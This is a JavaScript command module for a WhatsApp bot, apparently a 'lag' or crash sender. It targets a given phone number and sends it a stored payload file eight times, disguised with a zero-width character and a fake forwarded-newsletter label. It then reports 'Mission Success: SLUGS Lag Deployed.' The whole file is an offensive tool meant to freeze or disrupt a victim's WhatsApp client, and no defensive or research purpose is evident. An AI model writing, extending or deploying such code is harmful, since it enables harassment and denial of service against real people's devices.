const fs = require('fs');
const config = require('../../config');

module.exports = {
    name: "slugs",
    execute: async (conn, msg, args, { from, isOwner }) => {
        if (!isOwner) return;
        let target = args[0]?.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        const payload = fs.readFileSync('./lib/payloads/slugs.txt', 'utf-8');

        for (let i = 0; i < 8; i++) {
            await conn.sendPresenceUpdate('recording', target);
            await conn.sendMessage(target, { 
                text: "\u200B" + payload,
                contextInfo: { forwardedNewsletterMessageInfo: { newsletterJid: config.newsletterJid, newsletterName: "ʟᴀɢ ꜱᴇʀᴠɪᴄᴇ" } }
            });
        }
        await conn.sendMessage(conn.user.id, { text: "🥀 Mission Success: SLUGS Lag Deployed." });
    }
};
